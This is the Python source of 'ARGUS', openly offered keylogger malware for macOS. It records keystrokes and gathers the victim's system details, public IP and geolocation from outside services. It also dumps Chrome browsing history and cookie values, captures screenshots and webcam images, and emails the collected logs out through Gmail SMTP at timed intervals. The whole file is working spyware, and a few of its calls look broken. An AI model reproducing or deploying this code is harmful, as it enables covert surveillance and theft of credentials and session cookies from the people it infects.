    



import time
import os
import threading 
import smtplib
import sys
import platform
import sqlite3
import psutil
import mimetypes
import socket
import requests
import urllib.request
import json
from pynput.keyboard import Listener
import pyscreenshot
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import ecapture as ec







BLUE, RED, WHITE, YELLOW, GREEN, CYAN, MAGENTA, =('\033[1;34;40m', '\033[1;31;40m', '\033[1;37;40m', '\033[1;33;40m', '\033[1;32;40m', '\033[1;36;40m', '\033[1;35;40m')

#Run As Root!
if os.getuid() != 0:
    sys.exit( RED + '\nError: ARGUS Must Be Run As root\n\nExiting...\n' + WHITE )

sys.stdout.write(RED + '''

                                                       
  

     ___      .______        _______  __    __       _______.
    /   \     |   _  \      /  _____||  |  |  |     /       |
   /  ^  \    |  |_)  |    |  |  __  |  |  |  |    |   (----`
  /  /_\  \   |      /     |  | |_ | |  |  |  |     \   \    
 /  _____  \  |  |\  \----.|  |__| | |  `--'  | .----)   | 'OSX'   
/__/     \__\ | _| `._____| \______|  \______/  |_______/ '''+ CYAN + '\tBY ALDON\n\n\n\n' )
print(WHITE + '                               ')




#get system info
getsysinfo = {'getuname':os.uname(),'getlogin':os.getlogin(),'getpid':os.getpid(),'getenv':os.getenv('HOME'),'datetime':time.ctime(time.time())}

private_ip = socket.gethostbyname(socket.gethostname())

public_ip = requests.get('http://ip.42.pl/raw').text

#getlocation
with urllib.request.urlopen("https://geolocation-db.com/json") as url:
    data = json.loads(url.read().decode())
    


combined = f"""[+++] Argus Started At {getsysinfo['datetime']} [+++]\n \n[+++] Victim Sysinfo : {getsysinfo['getuname']} [+++]\n \n
[+++] User : {getsysinfo['getlogin']} [+++]\n\n[+++] Home Environment : {getsysinfo['getenv']} [+++]\n \n[+++] Public IP Address : {public_ip} [+++]\n \n[+++] Private IP Address : {private_ip} [+++]\n \n[+++] Location : {data} [+++] \n  """





class Monitor():

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "ARGUS"
        self.email = email
        self.password = password
        self.subject = "ARGUS Keylogger Summary"


    def appendlog(self, string):
        self.log = self.log + string




    def save_data(self, key):
        #key handling
        

        try:
            pressed = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed = "SPACE"
            elif key == key.esc:
                pressed = "ESC"
            else:
                pressed = " " + str(key) + " "


        self.appendlog(pressed)




    def send_mail(self, email, password, message, subject="ARGUS"):


        try:
            
            #send to email

            mail_content = message #logs, screenshotss, ...etc

            sender_address = email  #What is Your Email  #Specify in the Bottom of the code!
            sender_pass = password  #What is Your Password #Specify in the Bottom of the code!
            receiver_address = email    #Where to send
            #Setup the MIME
            message_mail = MIMEMultipart()        
            message_mail['From'] = sender_address   #from?
            message_mail['To'] = receiver_address    #To who?
            message_mail['Subject'] = subject       #The subject line
            #The body and the attachments for the mail
            message_mail.attach(MIMEText(mail_content, 'plain'))
            #Create SMTP session for sending the mail
            session = smtplib.SMTP('smtp.gmail.com', 587)   #use gmail with port
            session.starttls()       #connect  with TLS 
            session.login(sender_address, sender_pass)  #login with mail_id and password
            text = message_mail.as_string()
            session.sendmail(sender_address, receiver_address, subject, text)
            session.quit()
        except Exception as e:
            print(e)

    def report_mail(self):
        

        self.send_mail(self.email, self.password, "\n\n" + self.log, self.subject)
        self.log = ""
        time_interval_ = threading.Timer(self.interval, self.report_mail)
        time_interval_.start()


    
    def Sysinfo(self):

        global combined
    
        
        self.appendlog(combined)



    
    def dump_history(self):

        # dump Chrome History  I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process 
        # And This could be danger if you doing it for real!

        try:

            con = sqlite3.connect(os.getenv("HOME") + "/Library/ApplicationSupport/Google/Chrome/Default/History")
            cur = con.cursor()
            cur.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cur.fetchall():

                self.appendlog("Website: %s \n\t Title: %s \n\t Last Visited: %s \n\n" % (
                u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
                u''.join(str(row[2])).encode('utf-8').strip()))


        except Exception:
            pass


    def dump_cookies(self):

        # dump Chrome Cookies I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process 
        # And This could be danger if you doing it for real!


        try:
            con = sqlite3.connect(os.getenv("HOME") + "/Library/ApplicationSupport/Google/Chrome/Default/Cookies")
            cur = con.cursor()
            cur.execute('SELECT host_key, name, value FROM Cookies')
            for row in cur.fetchall():
                self.appendlog("Hostname: %s \n\t Name: %s \n\t Value: %s \n\n" % 
                (u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),u''.join(row[2]).strip()))


        except Exception:
            pass


    def _screenshot(self):

        

        sct = pyscreenshot.grab()
        self.send_mail(email="EMAIL", password="PASSWORD", message=sct)



    def webcam(self):

        try:

            capt = ec.capture(0,False,f'{time.time()}.jpg')
            self.appendlog(capt)
            
        except Exception:
            pass






    def run(self):

        keyboard_logger = Listener(on_press=self.save_data)
        with keyboard_logger:
            self.report_mail()
            keyboard_logger.join()





Your_Email = "example@gmail.com" # Change This
Your_Password = "Your Password"  # Change This  


if __name__ == '__main__':

    # INCREASE THE INTERVAL TIMER  AS MUCH AS YOU CAN OTHERWISE GOOGLE May Disable YOUR ACCOUNT
    #Interval in Secounds Default is 60s ~ 1MIN

    logger = Monitor(60,Your_Email,Your_Password)
    logger.run()
